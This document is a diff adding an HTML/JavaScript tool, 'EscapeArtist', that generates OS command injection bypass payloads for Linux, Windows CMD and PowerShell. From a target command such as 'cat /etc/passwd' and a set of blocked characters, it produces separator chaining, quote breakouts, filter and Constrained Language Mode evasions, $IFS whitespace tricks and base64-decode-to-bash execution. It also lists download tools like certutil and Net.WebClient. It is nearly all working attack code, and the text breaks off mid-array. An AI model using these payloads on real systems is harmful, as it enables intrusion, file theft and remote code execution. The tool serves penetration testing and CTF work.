@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>EscapeArtist — Command Injection Bypass Cheatsheet</title>
+<style>
+  :root {
+    --bg-primary: #0a0e17; --bg-secondary: #111827; --bg-card: #1a2236; --bg-code: #0d1117;
+    --border: #2a3a52; --accent: #00ff88; --accent-dim: #00cc6a; --accent-glow: rgba(0, 255, 136, 0.15);
+    --cyan: #22d3ee; --orange: #fb923c; --pink: #f472b6; --purple: #a78bfa; --red: #f87171; --yellow: #fbbf24;
+    --text-primary: #e2e8f0; --text-secondary: #94a3b8; --text-muted: #64748b;
+    --font-mono: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', Consolas, monospace;
+    --font-sans: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+    --radius: 12px; --radius-sm: 8px;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap');
+  body { background: var(--bg-primary); color: var(--text-primary); font-family: var(--font-sans); min-height: 100vh; overflow-x: hidden; }
+  body::before { content: ''; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background-image: linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px); background-size: 50px 50px; pointer-events: none; z-index: 0; }
+  .container { max-width: 1200px; margin: 0 auto; padding: 20px; position: relative; z-index: 1; }
+  header { text-align: center; padding: 50px 20px 40px; position: relative; }
+  header::after { content: ''; position: absolute; bottom: 0; left: 50%; transform: translateX(-50%); width: 200px; height: 1px; background: linear-gradient(90deg, transparent, var(--accent), transparent); }
+  .logo { font-size: 3.2rem; font-weight: 900; letter-spacing: -1px; margin-bottom: 6px; background: linear-gradient(135deg, var(--accent), var(--cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+  .logo-icon { display: inline-block; margin-right: 8px; font-style: normal; -webkit-text-fill-color: var(--accent); filter: drop-shadow(0 0 20px rgba(0,255,136,0.4)); animation: pulse-glow 2s ease-in-out infinite; }
+  @keyframes pulse-glow { 0%, 100% { filter: drop-shadow(0 0 20px rgba(0,255,136,0.4)); } 50% { filter: drop-shadow(0 0 30px rgba(0,255,136,0.7)); } }
+  .tagline { font-size: 1.05rem; color: var(--text-secondary); margin-top: 4px; }
+  .badge { display: inline-block; margin-top: 14px; padding: 5px 14px; background: var(--accent-glow); border: 1px solid rgba(0,255,136,0.2); border-radius: 50px; font-size: 0.75rem; color: var(--accent); font-family: var(--font-mono); font-weight: 500; }
+  .input-section { background: var(--bg-secondary); border: 1px solid var(--border); border-radius: var(--radius); padding: 28px; margin: 36px 0; position: relative; overflow: hidden; }
+  .input-section::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px; background: linear-gradient(90deg, var(--accent), var(--cyan), var(--purple)); }
+  .section-label { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 2px; color: var(--accent); font-weight: 600; margin-bottom: 14px; font-family: var(--font-mono); }
+  .cmd-input-wrapper { display: flex; gap: 12px; margin-bottom: 20px; }
+  .prompt-symbol { display: flex; align-items: center; font-family: var(--font-mono); font-size: 1.1rem; color: var(--accent); font-weight: 700; padding: 0 4px; }
+  #cmdInput { flex: 1; background: var(--bg-code); border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 14px 18px; font-family: var(--font-mono); font-size: 1rem; color: var(--text-primary); outline: none; transition: all 0.3s; }
+  #cmdInput:focus { border-color: var(--accent); box-shadow: 0 0 0 3px var(--accent-glow); }
+  #cmdInput::placeholder { color: var(--text-muted); }
+  .btn-generate { padding: 14px 28px; background: linear-gradient(135deg, var(--accent), var(--accent-dim)); color: var(--bg-primary); border: none; border-radius: var(--radius-sm); font-size: 0.9rem; font-weight: 700; cursor: pointer; transition: all 0.2s; white-space: nowrap; }
+  .btn-generate:hover { transform: translateY(-1px); box-shadow: 0 4px 20px rgba(0,255,136,0.3); }
+  .filters-label { font-size: 0.75rem; color: var(--text-secondary); margin-bottom: 10px; font-weight: 500; }
+  .filters { display: flex; flex-wrap: wrap; gap: 8px; }
+  .filter-chip { display: flex; align-items: center; gap: 6px; padding: 6px 14px; background: var(--bg-code); border: 1px solid var(--border); border-radius: 50px; font-size: 0.78rem; color: var(--text-secondary); cursor: pointer; transition: all 0.2s; user-select: none; font-family: var(--font-mono); }
+  .filter-chip:hover { border-color: var(--text-muted); }
+  .filter-chip.active { border-color: var(--red); background: rgba(248,113,113,0.1); color: var(--red); }
+  .filter-chip input { display: none; }
+  .os-toggle { display: flex; gap: 8px; margin-bottom: 16px; }
+  .os-btn { padding: 6px 18px; background: var(--bg-code); border: 1px solid var(--border); border-radius: 50px; font-size: 0.8rem; color: var(--text-secondary); cursor: pointer; font-family: var(--font-mono); font-weight: 500; transition: all 0.2s; }
+  .os-btn.active { border-color: var(--cyan); background: rgba(34,211,238,0.1); color: var(--cyan); }
+  .stats-bar { display: flex; gap: 20px; margin: 20px 0 10px; padding-top: 16px; border-top: 1px solid var(--border); font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-muted); }
+  .stats-bar span { color: var(--accent); font-weight: 600; }
+  #results { display: flex; flex-direction: column; gap: 20px; padding-bottom: 60px; }
+  .category { background: var(--bg-secondary); border: 1px solid var(--border); border-radius: var(--radius); overflow: hidden; animation: fadeSlideIn 0.4s ease forwards; opacity: 0; transform: translateY(12px); }
+  @keyframes fadeSlideIn { to { opacity: 1; transform: translateY(0); } }
+  .category-header { display: flex; align-items: center; justify-content: space-between; padding: 18px 22px; cursor: pointer; transition: background 0.2s; user-select: none; }
+  .category-header:hover { background: rgba(255,255,255,0.02); }
+  .category-title-group { display: flex; align-items: center; gap: 12px; }
+  .category-icon { width: 36px; height: 36px; border-radius: var(--radius-sm); display: flex; align-items: center; justify-content: center; font-size: 1.1rem; }
+  .category-title { font-size: 0.95rem; font-weight: 700; color: var(--text-primary); }
+  .category-count { font-size: 0.72rem; color: var(--text-muted); font-family: var(--font-mono); margin-top: 2px; }
+  .chevron { color: var(--text-muted); transition: transform 0.3s; font-size: 0.9rem; }
+  .category.open .chevron { transform: rotate(180deg); }
+  .category-body { max-height: 0; overflow: hidden; transition: max-height 0.4s ease; }
+  .category.open .category-body { max-height: 8000px; }
+  .technique-list { padding: 0 22px 18px; display: flex; flex-direction: column; gap: 8px; }
+  .technique { background: var(--bg-code); border: 1px solid rgba(255,255,255,0.04); border-radius: var(--radius-sm); padding: 14px 16px; transition: border-color 0.2s; }
+  .technique:hover { border-color: var(--border); }
+  .technique-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
+  .technique-name { font-size: 0.78rem; font-weight: 600; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.5px; }
+  .technique-tags { display: flex; gap: 6px; }
+  .tag { font-size: 0.65rem; padding: 2px 8px; border-radius: 50px; font-family: var(--font-mono); font-weight: 500; }
+  .tag-linux { background: rgba(0,255,136,0.1); color: var(--accent); }
+  .tag-windows { background: rgba(34,211,238,0.1); color: var(--cyan); }
+  .tag-blind { background: rgba(251,191,36,0.1); color: var(--yellow); }
+  .tag-oob { background: rgba(167,139,250,0.1); color: var(--purple); }
+  .tag-ps { background: rgba(244,114,182,0.1); color: var(--pink); }
+  .tag-cmd { background: rgba(251,146,60,0.1); color: var(--orange); }
+  .technique-desc { font-size: 0.78rem; color: var(--text-muted); margin-bottom: 10px; line-height: 1.5; }
+  .cmd-block { display: flex; align-items: stretch; background: rgba(0,0,0,0.3); border-radius: 6px; overflow: hidden; border: 1px solid rgba(255,255,255,0.05); }
+  .cmd-text { flex: 1; padding: 10px 14px; font-family: var(--font-mono); font-size: 0.85rem; color: var(--accent); overflow-x: auto; white-space: pre-wrap; line-height: 1.6; }
+  .btn-copy { padding: 10px 14px; background: transparent; border: none; border-left: 1px solid rgba(255,255,255,0.05); color: var(--text-muted); cursor: pointer; transition: all 0.2s; display: flex; align-items: center; gap: 6px; font-family: var(--font-mono); font-size: 0.72rem; }
+  .btn-copy:hover { background: rgba(255,255,255,0.05); color: var(--accent); }
+  .btn-copy.copied { color: var(--accent); }
+  .empty-state { text-align: center; padding: 80px 20px; color: var(--text-muted); }
+  .empty-state .icon { font-size: 3rem; margin-bottom: 16px; opacity: 0.4; }
+  .empty-state p { font-size: 0.95rem; max-width: 400px; margin: 0 auto; line-height: 1.6; }
+  footer { text-align: center; padding: 40px 20px; border-top: 1px solid var(--border); margin-top: 20px; }
+  footer .credit { font-family: var(--font-mono); font-size: 0.82rem; color: var(--text-muted); }
+  footer .credit a { color: var(--accent); text-decoration: none; font-weight: 600; }
+  footer .credit a:hover { text-decoration: underline; }
+  footer .disclaimer { font-size: 0.72rem; color: var(--text-muted); margin-top: 10px; opacity: 0.7; max-width: 500px; margin-left: auto; margin-right: auto; line-height: 1.5; }
+  ::-webkit-scrollbar { width: 6px; height: 6px; } ::-webkit-scrollbar-track { background: transparent; } ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+  .toast { position: fixed; bottom: 30px; right: 30px; background: var(--bg-card); border: 1px solid var(--accent); border-radius: var(--radius-sm); padding: 12px 20px; font-family: var(--font-mono); font-size: 0.82rem; color: var(--accent); z-index: 9999; animation: toastIn 0.3s ease, toastOut 0.3s ease 1.7s forwards; box-shadow: 0 4px 24px rgba(0,255,136,0.2); }
+  @keyframes toastIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+  @keyframes toastOut { from { opacity: 1; transform: translateY(0); } to { opacity: 0; transform: translateY(20px); } }
+  @media (max-width: 640px) { .logo { font-size: 2.2rem; } .cmd-input-wrapper { flex-direction: column; } .btn-generate { width: 100%; } .container { padding: 12px; } .input-section { padding: 20px; } .stats-bar { flex-wrap: wrap; gap: 12px; } }
+  .search-wrapper { position: relative; margin-bottom: 24px; }
+  #searchInput { width: 100%; background: var(--bg-code); border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 12px 18px 12px 42px; font-family: var(--font-mono); font-size: 0.88rem; color: var(--text-primary); outline: none; }
+  #searchInput:focus { border-color: var(--accent); }
+  .search-icon { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); color: var(--text-muted); }
+</style>
+</head>
+<body>
+<div class="container">
+  <header>
+    <div class="logo"><i class="logo-icon">🎭</i>EscapeArtist</div>
+    <p class="tagline">Interactive OS Command Injection Bypass Cheatsheet</p>
+    <div class="badge">Made by Aryan Giri | giriaryan694-a11y</div>
+  </header>
+  <div class="input-section">
+    <div class="section-label">⚡ Enter Target Command</div>
+    <div class="os-toggle">
+      <button class="os-btn active" data-os="linux" onclick="setOS('linux')">🐧 Linux</button>
+      <button class="os-btn" data-os="windows" onclick="setOS('windows')">🪟 Windows</button>
+      <button class="os-btn" data-os="both" onclick="setOS('both')">🌐 Both</button>
+    </div>
+    <div class="cmd-input-wrapper">
+      <div class="prompt-symbol">$</div>
+      <input type="text" id="cmdInput" placeholder="cat /etc/passwd" autofocus spellcheck="false">
+      <button class="btn-generate" onclick="generate()">⚡ Generate</button>
+    </div>
+    <div class="filters-label">🚫 Mark blocked characters / features:</div>
+    <div class="filters" id="filtersContainer">
+      <label class="filter-chip" onclick="toggleFilter(this)"><input type="checkbox" value="space"> Space</label>
+      <label class="filter-chip" onclick="toggleFilter(this)"><input type="checkbox" value="semicolon"> ; Semicolon</label>
+      <label class="filter-chip" onclick="toggleFilter(this)"><input type="checkbox" value="pipe"> | Pipe</label>
+      <label class="filter-chip" onclick="toggleFilter(this)"><input type="checkbox" value="ampersand"> & Ampersand</label>
+      <label class="filter-chip" onclick="toggleFilter(this)"><input type="checkbox" value="backtick"> ` Backtick</label>
+      <label class="filter-chip" onclick="toggleFilter(this)"><input type="checkbox" value="dollar">$ Dollar</label>
+      <label class="filter-chip" onclick="toggleFilter(this)"><input type="checkbox" value="quote"> ' " Quotes</label>
+      <label class="filter-chip" onclick="toggleFilter(this)"><input type="checkbox" value="slash"> / Slash</label>
+      <label class="filter-chip" onclick="toggleFilter(this)"><input type="checkbox" value="parenthesis">( ) Parens</label>
+      <label class="filter-chip" onclick="toggleFilter(this)"><input type="checkbox" value="angle"> &lt; &gt; Angles</label>
+      <label class="filter-chip" onclick="toggleFilter(this)"><input type="checkbox" value="percent"> % Percent</label>
+    </div>
+    <div class="stats-bar" id="statsBar" style="display:none;">
+      Generated: <span id="statCount">0</span> techniques &nbsp;|&nbsp; Categories: <span id="statCats">0</span>
+    </div>
+  </div>
+  <div class="search-wrapper" id="searchWrapper" style="display:none;">
+    <span class="search-icon">🔍</span>
+    <input type="text" id="searchInput" placeholder="Search techniques..." oninput="filterResults()">
+  </div>
+  <div id="results">
+    <div class="empty-state">
+      <div class="icon">🎯</div>
+      <p>Enter a command above and hit <strong>Generate</strong> to see every bypass technique for it.</p>
+    </div>
+  </div>
+  <footer>
+    <div class="credit">Made with ☕ by <a href="https://github.com/giriaryan694-a11y" target="_blank">Aryan Giri</a> | <a href="https://github.com/giriaryan694-a11y" target="_blank">@giriaryan694-a11y</a></div>
+    <div class="disclaimer">⚠️ For authorized security testing, CTF challenges, and educational purposes only. Always obtain proper authorization before testing.</div>
+  </footer>
+</div>
+<script>
+let currentOS = 'linux';
+let activeFilters = new Set();
+function setOS(os) { currentOS = os; document.querySelectorAll('.os-btn').forEach(b => b.classList.remove('active')); document.querySelector(`.os-btn[data-os="${os}"]`).classList.add('active'); }
+function toggleFilter(el) { el.classList.toggle('active'); const val = el.querySelector('input').value; if (el.classList.contains('active')) activeFilters.add(val); else activeFilters.delete(val); }
+
+function toBase64(str) { return btoa(str); }
+function toHex(str) { return str.split('').map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2,'0')).join(''); }
+function toOctal(str) { return str.split('').map(c => '\\' + c.charCodeAt(0).toString(8).padStart(3,'0')).join(''); }
+function toURLEncode(str) { return encodeURIComponent(str); }
+function toDoubleURLEncode(str) { return encodeURIComponent(encodeURIComponent(str)); }
+function toPowerShellBase64(str) {
+  const bytes = []; for (let i = 0; i < str.length; i++) { const code = str.charCodeAt(i); bytes.push(code & 0xFF); bytes.push((code >> 8) & 0xFF); }
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'; let result = '';
+  for (let i = 0; i < bytes.length; i += 3) { const b0 = bytes[i]; const b1 = i + 1 < bytes.length ? bytes[i + 1] : 0; const b2 = i + 2 < bytes.length ? bytes[i + 2] : 0; result += chars[b0 >> 2]; result += chars[((b0 & 3) << 4) | (b1 >> 4)]; result += (i + 1 < bytes.length) ? chars[((b1 & 15) << 2) | (b2 >> 6)] : '='; result += (i + 2 < bytes.length) ? chars[b2 & 63] : '='; }
+  return result;
+}
+function randomCase(str) { return str.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join(''); }
+
+const COMMAND_CATEGORIES = {
+  file_reader: { commands: ['cat', 'more', 'less', 'head', 'tail', 'nl', 'tac', 'rev', 'strings', 'xxd', 'od', 'base64', 'sort', 'type', 'get-content'], linux_alts: ['more', 'less', 'head', 'tail', 'nl', 'sort', 'tac', 'rev', 'strings', 'xxd', 'od -c', 'base64'], win_cmd_alts: ['type FILE', 'more FILE'], win_ps_alts: ['Get-Content FILE', 'gc FILE', 'cat FILE', '[IO.File]::ReadAllText("FILE")'] },
+  directory_listing: { commands: ['ls', 'dir', 'tree', 'find'], linux_alts: ['find . -maxdepth 1', 'tree', 'stat', 'ls -la', 'ls -R', 'locate', 'echo *', 'printf "%s\\n" *'], win_cmd_alts: ['dir', 'dir /a', 'dir /s', 'tree'], win_ps_alts: ['Get-ChildItem', 'gci', 'ls', 'dir', '(Get-ChildItem).FullName'] },
+  path_info: { commands: ['pwd'], linux_alts: ['pwd', 'echo $PWD'], win_cmd_alts: ['cd', 'echo %CD%', 'chdir'], win_ps_alts: ['pwd', 'Get-Location', 'gl', '(Get-Location).Path'] },
+  network: { commands: ['curl', 'wget', 'nc', 'nmap', 'ping', 'host', 'dig', 'nslookup', 'ss', 'netstat', 'ifconfig', 'ip', 'ipconfig'], linux_alts: ['curl', 'wget', 'nc', 'nmap', 'ping', 'host', 'dig', 'ss -tuln', 'netstat -tuln', 'ip addr', 'ifconfig', 'traceroute'], win_cmd_alts: ['ping HOST', 'nslookup HOST', 'netstat -an', 'ipconfig /all', 'tracert HOST', 'pathping HOST'], win_ps_alts: ['Test-Connection HOST', 'Test-NetConnection HOST', 'Resolve-DnsName HOST', 'Get-NetTCPConnection', 'Invoke-WebRequest URI'] },
+  system_info: { commands: ['uname', 'hostname', 'whoami', 'id', 'uptime', 'free', 'df', 'du', 'mount', 'dmesg', 'lscpu', 'lsblk', 'env', 'printenv', 'systeminfo', 'set'], linux_alts: ['uname -a', 'hostname', 'whoami', 'id', 'uptime', 'free -h', 'df -h', 'du -sh', 'mount', 'dmesg', 'lscpu', 'lsblk', 'cat /etc/os-release'], win_cmd_alts: ['whoami', 'hostname', 'systeminfo', 'set', 'ver', 'net user', 'net accounts', 'wmic os get caption', 'tasklist'], win_ps_alts: ['whoami', '$env:USERNAME', '$env:COMPUTERNAME', 'Get-ComputerInfo', 'Get-Process', 'Get-Service', '[Environment]::OSVersion'] },
+  process: { commands: ['ps', 'top', 'htop', 'pgrep', 'pidof', 'lsof', 'strace', 'kill', 'tasklist', 'taskkill'], linux_alts: ['ps aux', 'top -b -n 1', 'htop', 'pgrep', 'pidof', 'lsof', 'strace', 'ps -ef'], win_cmd_alts: ['tasklist', 'tasklist /v', 'wmic process list brief', 'query process'], win_ps_alts: ['Get-Process', 'gps', 'Get-Process | Select-Object Name,Id,CPU'] },
+  search: { commands: ['grep', 'find', 'locate', 'which', 'whereis', 'apropos', 'man', 'ag', 'rg', 'where'], linux_alts: ['grep', 'find', 'locate', 'which', 'whereis', 'apropos', 'man', 'ag', 'rg'], win_cmd_alts: ['where COMMAND', 'findstr "STRING" FILE', 'dir /s /b FILE'], win_ps_alts: ['Get-Command CMD', 'Select-String -Path FILE -Pattern "STR"', 'Get-ChildItem -Recurse -Filter FILE'] },
+  download: { commands: ['wget', 'curl'], linux_alts: ['wget URL', 'curl -O URL', 'curl URL -o file'], win_cmd_alts: ['certutil -urlcache -split -f URL file', 'bitsadmin /transfer n URL file', 'curl -o file URL'], win_ps_alts: ['Invoke-WebRequest -Uri URL -OutFile file', '(New-Object Net.WebClient).DownloadFile("URL","file")', 'Start-BitsTransfer -Source URL -Destination file'] },
+  execute: { commands: ['bash', 'sh', 'cmd', 'powershell'], linux_alts: ['bash -c', 'sh -c', 'eval', 'exec'], win_cmd_alts: ['cmd /c CMD', 'cmd /c "CMD"'], win_ps_alts: ['powershell -c CMD', 'powershell -nop -c CMD', 'iex CMD', '& {CMD}'] },
+  generic: { commands: [], linux_alts: [], win_cmd_alts: [], win_ps_alts: [] }
+};
+
+function detectCategory(bin) { const lower = bin.toLowerCase(); for (const [cat, data] of Object.entries(COMMAND_CATEGORIES)) { if (data.commands.includes(lower)) return cat; } return 'generic'; }
+
+function escapeHtml(str) {
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
+}
+
+const FILTER_CHAR_MAP = {
+  space: [' '],
+  semicolon: [';'],
+  pipe: ['|'],
+  ampersand: ['&'],
+  backtick: ['`'],
+  dollar: ['$'],
+  quote: ["'", '"'],
+  slash: ['/'],
+  parenthesis: ['(', ')'],
+  angle: ['<', '>'],
+  percent: ['%']
+};
+function computeNeeds(cmdStr) {
+  const needs = [];
+  for (const [filterName, chars] of Object.entries(FILTER_CHAR_MAP)) {
+    if (chars.some(ch => cmdStr.includes(ch))) needs.push(filterName);
+  }
+  return needs;
+}
+
+function generateTechniques(cmd) {
+  const parts = cmd.trim().split(/\s+/); const bin = parts[0] || 'cat'; const args = parts.slice(1).join(' '); const fullCmd = cmd.trim();
+  const b64 = toBase64(fullCmd); const psB64 = toPowerShellBase64(fullCmd); const hex = toHex(fullCmd); const oct = toOctal(fullCmd); const url = toURLEncode(fullCmd);
+  const fileArg = args || '/etc/passwd'; const winFileArg = args ? args.replace(/\//g, '\\') : 'C:\\Windows\\System32\\drivers\\etc\\hosts';
+  const category = detectCategory(bin); const catData = COMMAND_CATEGORIES[category];
+  const cats = [];
+
+  // ========== COMMAND CHAINING ==========
+  // FIXED: Prepended dummy commands (`echo`, `true`, `false`, `(call)`) to all separators.
+  // Before: `| pwd` (Syntax Error in empty shell)
+  // After: `echo|pwd` (Valid syntax, executes successfully)
+  const chaining = { name: 'Command Chaining & Separators', icon: '🔗', color: 'var(--accent)', techniques: [] };
+  chaining.techniques.push(
+    { name: 'Semicolon', desc: 'Execute sequentially regardless of exit code', cmd: `true; ${fullCmd}`, os: 'linux', needs: ['semicolon'] },
+    { name: 'Pipe', desc: 'Pipe dummy output to target command (stdin ignored by most cmds)', cmd: `echo|${fullCmd}`, os: 'linux', needs: ['pipe'] },
+    { name: 'AND Operator', desc: 'Execute only if previous command succeeds', cmd: `true&&${fullCmd}`, os: 'linux', needs: ['ampersand'] },
+    { name: 'OR Operator', desc: 'Execute only if previous command fails', cmd: `false||${fullCmd}`, os: 'linux', needs: ['pipe'] },
+    { name: 'Background Execution', desc: 'Run in background', cmd: `echo&${fullCmd}&`, os: 'linux', needs: ['ampersand'] },
+    { name: 'Command Substitution $()', desc: 'Execute within subshell', cmd: `echo$(${fullCmd})`, os: 'linux', needs: ['dollar','parenthesis'] },
+    { name: 'Backtick Substitution', desc: 'Legacy command substitution', cmd: 'echo`' + fullCmd + '`', os: 'linux', needs: ['backtick'] },
+    { name: 'CMD: Ampersand &', desc: 'Windows CMD sequential execution', cmd: `echo&${fullCmd}`, os: 'windows', needs: ['ampersand'], win: 'cmd' },
+    { name: 'CMD: Pipe |', desc: 'Windows CMD pipe', cmd: `echo|${fullCmd}`, os: 'windows', needs: ['pipe'], win: 'cmd' },
+    { name: 'CMD: AND &&', desc: 'Windows CMD conditional AND. ⚠️ Fails in PowerShell 5.1 (PS7+ only)', cmd: `echo&&${fullCmd}`, os: 'windows', needs: ['ampersand'], win: 'cmd' },
+    { name: 'CMD: OR ||', desc: 'Windows CMD conditional OR. Uses (call) to force fail. ⚠️ PS7+ only', cmd: `(call)||${fullCmd}`, os: 'windows', needs: ['pipe','parenthesis'], win: 'cmd' },
+    { name: 'CMD: Literal Newline', desc: 'Inject a literal newline character. Works in direct shell or multi-line HTTP params.', cmd: `echo\n${fullCmd}`, os: 'windows', needs: [], win: 'cmd' },
+    { name: 'PS: Semicolon', desc: 'PowerShell command separator', cmd: `echo;${fullCmd}`, os: 'windows', needs: ['semicolon'], win: 'ps' },
+    { name: 'PS: Pipe |', desc: 'PowerShell pipeline', cmd: `echo|${fullCmd}`, os: 'windows', needs: ['pipe'], win: 'ps' },
+    { name: 'PS: Call Operator &', desc: 'PowerShell call operator for execution', cmd: `& {${fullCmd}}`, os: 'windows', needs: ['ampersand'], win: 'ps' },
+    { name: 'PS 5.1: AND Equivalent', desc: 'PS 5.1 lacks &&. Run if previous succeeded ($? is true)', cmd: `echo;if($?){${fullCmd}}`, os: 'windows', needs: ['semicolon','parenthesis'], win: 'ps' },
+    { name: 'PS 5.1: OR Equivalent', desc: 'PS 5.1 lacks ||. Run if previous failed ($? is false)', cmd: `echo;if(-not$?){${fullCmd}}`, os: 'windows', needs: ['semicolon','parenthesis'], win: 'ps' },
+    { name: 'PS 7+: AND &&', desc: 'Pipeline chain AND. ✅ Works in PowerShell 7+ (Fails in default PS 5.1).', cmd: `echo&&${fullCmd}`, os: 'windows', needs: ['ampersand'], win: 'ps' },
+    { name: 'PS 7+: OR ||', desc: 'Pipeline chain OR. ✅ Works in PowerShell 7+ (Fails in default PS 5.1).', cmd: `echo||${fullCmd}`, os: 'windows', needs: ['pipe'], win: 'ps' },
+    { name: 'PS: Literal Newline', desc: 'Inject a literal newline character. Works in direct shell.', cmd: `echo\n${fullCmd}`, os: 'windows', needs: [], win: 'ps' }
+  );
+  cats.push(chaining);
+
+  // ========== CONTEXT ESCAPING ==========
+  const context = { name: 'Context Escaping (Quote/String Execution)', icon: '🧊', color: 'var(--cyan)', techniques: [] };
+  context.techniques.push(
+    { name: 'CMD: cmd /c (Force Exec)', desc: 'If the shell receives "pwd" (with quotes), CMD treats it as a file. "cmd /c" forces string evaluation.', cmd: `cmd /c ${fullCmd}`, os: 'windows', needs: ['slash'], win: 'cmd' },
+    { name: 'CMD: call (Exec Wrapper)', desc: 'Alternative to cmd /c for executing strings in batch contexts.', cmd: `call ${fullCmd}`, os: 'windows', needs: [], win: 'cmd' },
+    { name: 'PS: Call Operator &', desc: 'If PS receives "pwd", it prints a string. The & operator forces execution of the string.', cmd: `& ${fullCmd}`, os: 'windows', needs: ['ampersand'], win: 'ps' },
+    { name: 'PS: Invoke-Expression', desc: 'Evaluates and executes the string contents dynamically.', cmd: `iex ${fullCmd}`, os: 'windows', needs: [], win: 'ps' },
+    { name: 'PS: .NET Process Start', desc: 'Bypasses PS aliases and Constrained Language Mode by calling .NET directly.', cmd: `[Diagnostics.Process]::Start("cmd.exe", "/c ${fullCmd}")`, os: 'windows', needs: ['parenthesis','quote','slash'], win: 'ps' },
+    { name: 'PS: ScriptBlock Invoke', desc: 'Create and invoke a script block dynamically. Bypasses filters on iex/Invoke-Expression.', cmd: `$ExecutionContext.InvokeCommand.NewScriptBlock("${fullCmd}").Invoke()`, os: 'windows', needs: ['dollar','quote','parenthesis'], win: 'ps' },
+    { name: 'CMD: Quote Breakout', desc: 'If input is wrapped in quotes, close them, inject, and comment the rest.', cmd: `" & ${fullCmd} & "`, os: 'windows', needs: ['quote','ampersand'], win: 'cmd' },
+    { name: 'PS: Quote Breakout', desc: 'Close the string, inject separator, and comment the rest.', cmd: `"; ${fullCmd} #`, os: 'windows', needs: ['quote','semicolon'], win: 'ps' }
+  );
+  cats.push(context);
+
+  // ========== WHITESPACE BYPASS ==========
+  // FIXED: Removed "CMD: Comma Separator" as it fails on external executables.
+  // FIXED: CMD Environment variable space extraction corrected to `%PROGRAMFILES:~10,1%` for safe 1-char extraction.
+  const whitespace = { name: 'Whitespace Bypass', icon: '⬜', color: 'var(--cyan)', techniques: [] };
+  const noSpaceCmd = bin + (args ? '$IFS' + args.replace(/ /g, '$IFS') : ''); const noSpaceCmd2 = bin + (args ? '${IFS}' + args.replace(/ /g, '${IFS}') : '');
+  const tabCmd = bin + (args ? '\t' + args.replace(/ /g, '\t') : ''); const braceCmd = args ? `{${bin},${args.replace(/ /g, ',')}}` : bin; const redirectCmd = args ? `${bin}<${args.split(' ')[0]}` : bin;
+  whitespace.techniques.push(
+    { name: '$IFS Variable', desc: 'Internal Field Separator replaces spaces', cmd: noSpaceCmd, os: 'linux', needs: ['dollar','space'] },
+    { name: '${IFS} Braces', desc: 'IFS in brace expansion form', cmd: noSpaceCmd2, os: 'linux', needs: ['dollar','space'] },
+    { name: '$IFS$9', desc: 'IFS with positional param to terminate', cmd: bin + (args ? '$IFS$9' + args.replace(/ /g, '$IFS$9') : ''), os: 'linux', needs: ['dollar'] },
+    { name: 'Tab Character', desc: 'Use literal tab (%09) as space', cmd: tabCmd, os: 'linux', needs: ['space'] },
+    { name: 'Brace Expansion', desc: 'Bash brace expansion eliminates spaces', cmd: braceCmd, os: 'linux', needs: ['space'] },
+    { name: 'Input Redirect <', desc: 'Redirect file as stdin to command', cmd: redirectCmd, os: 'linux', needs: ['angle','space'] },
+    { name: 'Here-String <<<', desc: 'Pass string via here-string', cmd: `${bin}<<<${args || 'string'}`, os: 'linux', needs: ['angle'] },
+    { name: 'URL-Encoded Space', desc: '%20 as space in URLs', cmd: fullCmd.replace(/ /g, '%20'), os: 'both', needs: ['space'] },
+    { name: 'Plus Sign (+)', desc: 'In URL context, + represents space', cmd: fullCmd.replace(/ /g, '+'), os: 'both', needs: ['space'] },
+    { name: '{cmd,args} Commas', desc: 'Bash brace with commas (no spaces)', cmd: args ? `{${bin},${args.split(' ').join(',')}}` : bin, os: 'linux', needs: [] },
+    { name: 'CMD: Tab %09', desc: 'Tab character as space in CMD', cmd: fullCmd.replace(/ /g, '%09'), os: 'windows', needs: ['space'], win: 'cmd' },
+    { name: 'CMD: Env Var Space', desc: 'Extract space safely from %PROGRAMFILES% (index 10, length 1)', cmd: `${bin}%PROGRAMFILES:~10,1%${args ? args.replace(/ /g, '%PROGRAMFILES:~10,1%') : ''}`, os: 'windows', needs: ['percent','space'], win: 'cmd' },
+    { name: 'PS: Tab', desc: 'Tab character as whitespace separator in PowerShell', cmd: fullCmd.replace(/ /g, "`t"), os: 'windows', needs: ['space'], win: 'ps' }
+  );
+  cats.push(whitespace);
+
+  // ========== ENCODING & OBFUSCATION ==========
+  // ADDED: PS UTF8 Base64, PS Decimal Byte Array, Linux Python pipe, Linux Eval Base64
+  const encoding = { name: 'Encoding & Obfuscation', icon: '🔐', color: 'var(--purple)', techniques: [] };
+  encoding.techniques.push(
+    { name: 'Base64 Decode | Bash', desc: 'Encode full command in Base64, decode and pipe to bash', cmd: `echo ${b64}|base64 -d|bash`, os: 'linux', needs: ['pipe'] },
+    { name: 'Base64 Eval', desc: 'Use eval with command substitution to execute base64', cmd: `eval $(echo ${b64}|base64 -d)`, os: 'linux', needs: ['dollar','parenthesis','pipe'] },
+    { name: 'Base64 Decode | Python', desc: 'Decode base64 and execute via python pipe', cmd: `echo ${b64}|base64 -d|python`, os: 'linux', needs: ['pipe'] },
